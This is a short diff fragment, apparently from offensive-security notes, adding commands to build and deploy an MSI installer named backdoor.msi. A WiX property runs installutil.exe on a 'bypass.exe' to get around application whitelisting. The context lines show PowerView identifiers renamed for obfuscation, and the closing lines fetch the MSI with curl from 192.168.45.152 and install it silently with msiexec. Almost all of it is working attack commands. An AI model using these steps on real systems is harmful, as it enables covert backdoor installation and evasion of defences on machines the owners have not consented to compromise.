@@ -1083,3 +1083,12 @@ PowerView4
 [*] Replaced psenum With: tie
 [*] Replaced struct With: fearfulness
 
+[...]
+<Property Id="cmdline">cmd.exe /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe</Property>
+[...]
+
+candle.exe -out wix msi.xml
+light.exe -out backdoor.msi wix
+
+curl http://192.168.45.152/backdoor.msi -o C:\Windows\Tasks\backdoor.msi
+msiexec /quiet /qn /i C:\Windows\Tasks\backdoor.msi
